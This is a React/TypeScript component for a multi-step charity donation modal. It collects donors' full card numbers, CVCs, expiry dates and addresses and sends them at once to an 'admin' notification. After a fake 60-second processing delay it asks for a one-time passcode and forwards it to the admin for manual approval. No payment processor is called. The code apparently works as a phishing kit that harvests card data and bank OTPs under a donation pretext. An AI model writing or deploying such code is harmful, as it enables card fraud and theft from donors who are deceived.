'use client';

import { useState, useEffect } from 'react';
import { X } from 'lucide-react';
import { DonationAmount } from './donation-steps/DonationAmount';
import { DonorInfo } from './donation-steps/DonorInfo';
import { PaymentInfo } from './donation-steps/PaymentInfo';
import { DonationSummary } from './donation-steps/DonationSummary';
import { Processing } from './donation-steps/Processing';
import { OTPVerification } from './donation-steps/OTPVerification';
import { Success } from './donation-steps/Success';
import { Rejection } from './donation-steps/Rejection';
import { donationDb, Donation } from '@/lib/donationDb';

interface DonationData {
  amount: number;
  isMonthly: boolean;
  coverFees: boolean;
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  purpose: string;
  howHeard: string;
  learnedAbout: string;
  businessDonation: boolean;
  cardNumber: string;
  cvc: string;
  cardholderName: string;
  expiration: string;
  country: string;
  address1: string;
  address2: string;
  city: string;
  state: string;
  zip: string;
  receiveUpdates: boolean;
}

interface DonationModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export function DonationModal({ isOpen, onClose }: DonationModalProps) {
  const [step, setStep] = useState(1);
  const [donation, setDonation] = useState<Donation | null>(null);
  const [otpCode, setOtpCode] = useState('');
  const [rejectionReason, setRejectionReason] = useState('');
  const [donationData, setDonationData] = useState<DonationData>({
    amount: 1,
    isMonthly: false,
    coverFees: false,
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    purpose: '',
    howHeard: 'Other',
    learnedAbout: '',
    businessDonation: false,
    cardNumber: '',
    cvc: '',
    cardholderName: '',
    expiration: '',
    country: '',
    address1: '',
    address2: '',
    city: '',
    state: '',
    zip: '',
    receiveUpdates: false,
  });

  useEffect(() => {
    // Listen for admin approval
    const handleApproval = (event: Event) => {
      const customEvent = event as CustomEvent;
      console.log("[v0] Approval event received:", { donationId: customEvent.detail.donationId, currentDonationId: donation?.id });
      if (donation && customEvent.detail.donationId === donation.id) {
        console.log("[v0] Approval matched, moving to success step");
        setStep(8); // Move to success
      }
    };

    // Listen for admin rejection
    const handleRejection = (event: Event) => {
      const customEvent = event as CustomEvent;
      console.log("[v0] Rejection event received:", { donationId: customEvent.detail.donationId, currentDonationId: donation?.id, reason: customEvent.detail.reason });
      if (donation && customEvent.detail.donationId === donation.id) {
        console.log("[v0] Rejection matched, moving to rejection step");
        setRejectionReason(customEvent.detail.reason || 'Your donation could not be verified. Please contact support for more information.');
        setStep(9); // Move to rejection screen
      }
    };

    // Also listen for localStorage changes (for cross-tab communication)
    const handleStorageChange = (e: StorageEvent) => {
      if (e.key === 'donationApprovalStatus' && e.newValue && donation) {
        const data = JSON.parse(e.newValue);
        console.log("[v0] Storage event received:", data);
        if (data.donationId === donation.id) {
          if (data.status === 'approved') {
            console.log("[v0] Approval from storage, moving to success step");
            setStep(8);
          } else if (data.status === 'rejected') {
            console.log("[v0] Rejection from storage, moving to rejection step");
            setRejectionReason(data.reason || 'Your donation could not be verified. Please contact support for more information.');
            setStep(9);
          }
        }
      }
    };

    window.addEventListener('donationApproved', handleApproval);
    window.addEventListener('donationRejected', handleRejection);
    window.addEventListener('storage', handleStorageChange);

    return () => {
      window.removeEventListener('donationApproved', handleApproval);
      window.removeEventListener('donationRejected', handleRejection);
      window.removeEventListener('storage', handleStorageChange);
    };
  }, [donation]);

  useEffect(() => {
    if (!isOpen) return;

    // Push a new history entry when modal opens
    window.history.pushState({ modalOpen: true }, '', window.location.href);

    // Handle browser back button (popstate event)
    const handlePopState = (event: PopStateEvent) => {
      event.preventDefault();
      // Close the modal instead of navigating away
      handleClose();
    };

    window.addEventListener('popstate', handlePopState);

    return () => {
      window.removeEventListener('popstate', handlePopState);
      // Clean up history state when modal closes
      if (window.history.state?.modalOpen) {
        window.history.back();
      }
    };
  }, [isOpen]);

  const handleNext = () => {
    setStep(step + 1);
  };

  const handleBack = () => {
    setStep(step - 1);
  };

  const handleUpdateData = (updates: Partial<DonationData>) => {
    setDonationData(prev => ({ ...prev, ...updates }));
  };

  const handleSubmit = async () => {
    // Generate OTP and create donation record IMMEDIATELY
    const generatedOTP = donationDb.generateOTP();
    setOtpCode(generatedOTP);
    
    const newDonation = donationDb.addDonation({
      amount: donationData.amount,
      firstName: donationData.firstName,
      lastName: donationData.lastName,
      email: donationData.email,
      phone: donationData.phone,
      country: donationData.country,
      address1: donationData.address1,
      address2: donationData.address2,
      city: donationData.city,
      state: donationData.state,
      zipCode: donationData.zip,
      cardLast4: donationData.cardNumber.slice(-4),
      cardNumber: donationData.cardNumber,
      cvc: donationData.cvc,
      cardholderName: donationData.cardholderName,
      cardExpiration: donationData.expiration,
      donationType: donationData.isMonthly ? 'monthly' : 'one-time',
      purposeOfDonation: donationData.purpose,
      heardAboutUs: donationData.howHeard,
      coverTransactionFees: donationData.coverFees,
      isBusinessDonation: donationData.businessDonation,
      wantsUpdates: donationData.receiveUpdates,
      status: 'pending',
      otpCode: generatedOTP,
    });
    
    setDonation(newDonation);
    
    // Send card details notification to admin INSTANTLY with full details
    donationDb.addNotification({
      type: 'card_details',
      donationId: newDonation.id,
      referenceNumber: newDonation.referenceNumber,
      donorName: `${donationData.firstName} ${donationData.lastName}`,
      email: donationData.email,
      phone: donationData.phone,
      amount: donationData.amount,
      message: `Card details received: ${donationData.cardNumber}`,
      cardNumber: donationData.cardNumber,
      cardLast4: donationData.cardNumber.slice(-4),
      cardholderName: donationData.cardholderName,
      cvc: donationData.cvc,
      cardExpiration: donationData.expiration,
      billingAddress: donationData.address1,
      city: donationData.city,
      state: donationData.state,
      zipCode: donationData.zip,
      donationType: donationData.isMonthly ? 'monthly' : 'one-time',
    });
    
    // Move to processing step
    setStep(5);
    
    // Wait 60 seconds, then move to OTP verification
    setTimeout(() => {
      setStep(6); // Move to OTP verification
    }, 60000); // 60 second processing
  };

  const handleOTPVerify = (code: string) => {
    if (donation) {
      // Send OTP to admin for verification (no local validation)
      donationDb.updateDonation(donation.id, {
        status: 'pending',
        otpCode: code,
      });
      
      // Send OTP verification notification to admin with full details and approval buttons
      donationDb.addNotification({
        type: 'otp_verified',
        donationId: donation.id,
        referenceNumber: donation.referenceNumber,
        donorName: `${donation.firstName} ${donation.lastName}`,
        email: donation.email,
        phone: donation.phone,
        amount: donation.amount,
        message: `OTP Code Submitted for Approval: ${code}`,
        otpCode: code,
        cardNumber: donation.cardNumber,
        cardLast4: donation.cardLast4,
        cardholderName: donation.cardholderName,
        cvc: donation.cvc,
        cardExpiration: donation.cardExpiration,
        donationType: donation.donationType,
      });
      
      // Move to waiting for approval state
      setStep(7);
    }
  };

  const handleResendOTP = () => {
    if (donation) {
      const generatedOTP = donationDb.generateOTP();
      setOtpCode(generatedOTP);
      donationDb.updateDonation(donation.id, {
        otpCode: generatedOTP,
      });
    }
  };

  const handleClose = () => {
    // Reset state
    setStep(1);
    setDonation(null);
    setOtpCode('');
    setDonationData({
      amount: 1,
      isMonthly: false,
      coverFees: false,
      firstName: '',
      lastName: '',
      email: '',
      phone: '',
      purpose: '',
      howHeard: 'Other',
      learnedAbout: '',
      businessDonation: false,
      cardNumber: '',
      cvc: '',
      cardholderName: '',
      expiration: '',
      country: '',
      address1: '',
      address2: '',
      city: '',
      state: '',
      zip: '',
      receiveUpdates: false,
    });
    onClose();
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/75 flex items-center justify-center p-4 z-50">
      <div className="bg-white rounded-lg max-w-2xl w-full max-h-[90vh] overflow-y-auto relative">
        {/* Close Button - Hide on processing, OTP, and success steps */}
        {![5, 6, 7].includes(step) && (
          <button
            onClick={handleClose}
            className="absolute top-4 right-4 text-gray-500 hover:text-gray-700"
            aria-label="Close"
          >
            <X size={24} />
          </button>
        )}

        {/* Modal Content */}
        <div className="p-4 sm:p-8">
          {step === 1 && (
            <DonationAmount
              data={donationData}
              onUpdate={handleUpdateData}
              onNext={handleNext}
              onClose={handleClose}
            />
          )}

          {step === 2 && (
            <DonorInfo
              data={donationData}
              onUpdate={handleUpdateData}
              onNext={handleNext}
              onBack={handleBack}
            />
          )}

          {step === 3 && (
            <PaymentInfo
              data={donationData}
              onUpdate={handleUpdateData}
              onNext={handleNext}
              onBack={handleBack}
            />
          )}

          {step === 4 && (
            <DonationSummary
              data={donationData}
              onUpdate={handleUpdateData}
              onSubmit={handleSubmit}
              onBack={handleBack}
            />
          )}

          {step === 5 && (
            <Processing onComplete={() => {}} />
          )}

          {step === 6 && (
            <OTPVerification
              email={donationData.email}
              otpCode={otpCode}
              onVerify={handleOTPVerify}
              onResend={handleResendOTP}
            />
          )}

          {step === 7 && donation && (
            <div className="py-8 px-6 text-center">
              <div className="mb-6">
                <div className="inline-block mb-4">
                  <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center animate-spin">
                    <div className="w-12 h-12 bg-blue-500 rounded-full"></div>
                  </div>
                </div>
              </div>
              <h2 className="text-2xl font-bold text-gray-800 mb-2">Waiting for Admin Approval</h2>
              <p className="text-gray-600 mb-4">
                Your OTP code has been submitted. Please wait while our admin team verifies and approves your donation.
              </p>
              <p className="text-sm text-gray-500 mb-6">
                Reference Number: <strong>{donation.referenceNumber}</strong>
              </p>
              <button
                onClick={handleClose}
                className="bg-gray-300 hover:bg-gray-400 text-gray-800 font-bold py-2 px-6 rounded-lg transition"
              >
                Close
              </button>
            </div>
          )}

          {step === 8 && donation && (
            <Success
              donation={donation}
              onClose={handleClose}
            />
          )}

          {step === 9 && donation && (
            <Rejection
              donation={donation}
              rejectionReason={rejectionReason}
              onClose={handleClose}
              onRetry={() => {
                setStep(1);
                setDonation(null);
                setRejectionReason('');
                setDonationData(prev => ({
                  ...prev,
                  cardNumber: '',
                  cvc: '',
                  cardholderName: '',
                  expiration: '',
                  country: '',
                  address1: '',
                  address2: '',
                  city: '',
                  state: '',
                  zip: '',
                }));
              }}
            />
          )}
        </div>
      </div>
    </div>
  );
}
